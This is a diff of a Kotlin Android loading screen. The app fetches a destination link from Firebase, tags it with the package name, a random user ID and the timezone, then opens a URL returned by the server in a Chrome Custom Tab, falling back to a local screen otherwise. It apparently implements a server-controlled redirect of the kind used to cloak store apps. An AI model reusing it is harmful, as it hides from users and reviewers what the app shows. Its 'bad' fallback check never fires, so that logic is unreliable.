@@ -6,6 +6,7 @@ import android.net.Uri
 import androidx.appcompat.app.AppCompatActivity
 import android.os.Bundle
 import android.util.Log
+import android.webkit.WebView
 import androidx.browser.customtabs.CustomTabsIntent
 import androidx.core.content.ContextCompat
 import com.google.firebase.FirebaseApp
@@ -17,6 +18,12 @@ import com.google.firebase.database.ValueEventListener
 import com.google.firebase.messaging.FirebaseMessaging
 import com.template.R
 import com.template.databinding.ActivityLoadingBinding
+import okhttp3.Call
+import okhttp3.Callback
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.Response
+import okio.IOException
 import java.time.ZoneId
 import java.util.Calendar
 import java.util.UUID
@@ -24,6 +31,7 @@ import java.util.UUID
 class LoadingActivity : AppCompatActivity() {
     lateinit var mFirebaseAnalytics: FirebaseAnalytics
     private lateinit var binding: ActivityLoadingBinding
+    private lateinit var preferences: SharedPreferences
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -38,18 +46,24 @@ class LoadingActivity : AppCompatActivity() {
 //            customTabsIntent.launchUrl(this, Uri.parse(url));
 //        }
 
-        val preferences: SharedPreferences = getSharedPreferences("my", MODE_PRIVATE)
-        val url = preferences.getString("url", "") ?: ""
-        val alreadyRunWithInternet = preferences.getBoolean("alreadyRunWithInternet", false)
-        val saved = url.isNotEmpty()
+        preferences = getSharedPreferences("my", MODE_PRIVATE)
+        val url = preferences.getString("url", "") ?: "bad"
 
-        if(!isInternetAvailable(this)){
+        if(url == "bad") {
             startActivity(Intent(this, MainActivity::class.java))
             return
         }
 
-        if(alreadyRunWithInternet){
-            if(saved){
+        val alreadyRunWithInternet = preferences.getBoolean("alreadyRunWithInternet", false)
+        val saved = url.isNotEmpty()
+
+        if (!isInternetAvailable(this)) {
+            startActivity(Intent(this, MainActivity::class.java))
+            return
+        }
+
+        if (alreadyRunWithInternet) {
+            if (saved) {
                 openChromeCustomTab(url)
                 return
             } else {
@@ -67,7 +81,7 @@ class LoadingActivity : AppCompatActivity() {
         FirebaseMessaging.getInstance().subscribeToTopic("all")
         val database = FirebaseDatabase.getInstance()
         val ref = database.getReference("db")
-        ref.addValueEventListener(object : ValueEventListener{
+        ref.addValueEventListener(object : ValueEventListener {
             /**
              * This method will be called with a snapshot of the data at this location. It will also be called
              * each time that data changes.
@@ -77,12 +91,9 @@ class LoadingActivity : AppCompatActivity() {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val domenFromFireBase = snapshot.child("link")
                 val url = makeLink(domenFromFireBase.value.toString())
-                val editor = preferences.edit()
-                editor.putString("url", url)
-                editor.apply()
-                openChromeCustomTab(url)
+
+                getSite(url)
                 Log.d("LoadingActivity", "domenFromFireBase = $url")
-                finish()
             }
 
             /**
@@ -110,11 +121,45 @@ class LoadingActivity : AppCompatActivity() {
 
     private fun makeLink(domenFromFireBase: String): String {
         val res = "$domenFromFireBase/?" +
-                    "packageid=" + applicationContext.packageName +
-                    "&usserid=" + UUID.randomUUID() +
-                    "&getz=" + Calendar.getInstance().timeZone.id +
-                    "&getr=utm_source=google-play&utm_medium=organic"
+                "packageid=" + applicationContext.packageName +
+                "&usserid=" + UUID.randomUUID() +
+                "&getz=" + Calendar.getInstance().timeZone.id +
+                "&getr=utm_source=google-play&utm_medium=organic"
         return res
+    }
+
+    private fun getSite(aUrl: String) {
+        val client = OkHttpClient()
+
+        val webView = WebView(applicationContext)
+        val userAgent = webView.settings.userAgentString
+
+        // Создаем Request с использованием заданного URL-адреса и User Agent
+        val request = Request.Builder()
+            .url(aUrl)
+            .header("User-Agent", userAgent)
+            .build()
+
+        // Выполняем запрос
+        client.newCall(request).enqueue(object : Callback {
+            override fun onResponse(call: Call, response: Response) {
+                // Обработка ответа
+                val responseBody = response.body?.string()
+                response.code
+                if (responseBody != null) {
+                    val editor = this@LoadingActivity.preferences.edit()
+                    editor.putString("url", responseBody)
+                    editor.apply()
+                    openChromeCustomTab(responseBody)
+                    finish()
+                }
+            }
+
+            override fun onFailure(call: Call, e: IOException) {
+                // Обработка ошибки
+                Log.e("TAG", "Error: ${e.message}", e)
+            }
+        })
     }
 }
 
